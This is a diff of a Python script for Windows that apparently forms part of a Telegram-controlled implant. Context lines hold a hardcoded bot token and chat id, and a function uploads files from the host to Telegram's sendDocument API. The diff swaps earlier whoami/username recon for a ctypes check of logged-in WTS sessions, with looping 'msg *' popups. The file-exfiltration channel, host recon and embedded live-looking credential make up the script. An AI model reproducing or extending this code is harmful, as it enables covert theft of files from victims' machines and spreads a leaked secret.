@@ -7,6 +7,8 @@ import importlib.util
 import string
 import time
 import sys
+import ctypes
+import ctypes.wintypes
 
 chat_id = "-4102145810"
 token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
@@ -22,19 +24,56 @@ def send_file(chat_id, token, filepath):
         }
     r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)
 
-def get_computer_name():
-    computer_name = subprocess.check_output(["echo", "%COMPUTERNAME%"], shell=True, text=True).strip()
-    return computer_name
+def is_user_logged_in():
+    WTS_CURRENT_SERVER_HANDLE = 0
+    WTS_CURRENT_SESSION = -1
 
-def get_username():
-    username = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
-    return username
+    WTSActive = 0
+    WTSDisconnected = 1
 
-def get_whoami():
-    whoami = subprocess.check_output(["whoami"], shell=True, text=True).strip()
-    return whoami
+    class WTS_SESSION_INFO(ctypes.Structure):
+        _fields_ = [("SessionId", ctypes.wintypes.DWORD),
+                    ("pWinStationName", ctypes.wintypes.LPWSTR),
+                    ("State", ctypes.wintypes.DWORD)]
+
+    WTSEnumerateSessions = ctypes.windll.wtsapi32.WTSEnumerateSessionsW
+    WTSEnumerateSessions.restype = ctypes.wintypes.BOOL
+    WTSEnumerateSessions.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.POINTER(WTS_SESSION_INFO)), ctypes.POINTER(ctypes.wintypes.DWORD)]
+
+    WTSFreeMemory = ctypes.windll.wtsapi32.WTSFreeMemory
+    WTSFreeMemory.argtypes = [ctypes.c_void_p]
+
+    WTSQuerySessionInformation = ctypes.windll.wtsapi32.WTSQuerySessionInformationW
+    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL
+    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]
+
+    WTSUserName = 5
+    WTSQuerySessionInformation = ctypes.windll.wtsapi32.WTSQuerySessionInformationW
+    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL
+    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]
+
+    sessions = ctypes.POINTER(WTS_SESSION_INFO)()
+    count = ctypes.wintypes.DWORD()
+
+    if WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
+        for i in range(count.value):
+            session = sessions[i]
+            user_name = ctypes.wintypes.LPWSTR()
+            user_name_len = ctypes.wintypes.DWORD()
+            if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSUserName, ctypes.byref(user_name), ctypes.byref(user_name_len)):
+                if user_name.value:
+                    print(f"User {user_name.value} is logged in on session {session.SessionId}.")
+                    WTSFreeMemory(user_name)
+                    WTSFreeMemory(sessions)
+                    return True
+            WTSFreeMemory(user_name)
+
+    WTSFreeMemory(sessions)
+    return False
 
 while True:
-    whoami = get_whoami()
-    os.system(f"msg * result:{str(whoami)}")
-    time.sleep(5)
+    if is_user_logged_in():
+        os.system("msg * logged!")
+        break
+    else:
+        os.system("msg * notlogged..")
